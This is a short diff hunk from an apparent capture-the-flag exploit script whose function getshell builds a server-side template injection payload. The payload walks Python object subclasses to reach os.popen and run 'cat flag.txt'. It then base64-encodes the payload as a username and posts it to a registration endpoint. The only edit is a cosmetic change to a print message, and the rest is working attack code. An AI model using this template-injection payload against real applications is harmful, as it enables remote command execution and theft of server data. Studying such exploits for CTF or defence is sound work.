@@ -14,7 +14,7 @@ def getshell(url):
     payload='{{().__class__.__bases__[0].__subclasses__()[76].__init__.__globals__["__builtins__"]["__import__"]("os").popen("echo \|`cat flag.txt`").read()}}|'+''.join(random.sample(mapa, 9))
     username = str(base64.b64encode(payload.encode("utf-8")))[2:-1]
     print("[+] Generate payload: "+username)
-    print("[+] Injecting payload ...")
+    print("[+] Injecting payload...")
     data = requests.post(url + "/api/register", json={"username": username, "password": "justforfun"}, timeout=timeout).json()
     if data["success"]:
         print("[+] Inject payload success !!")
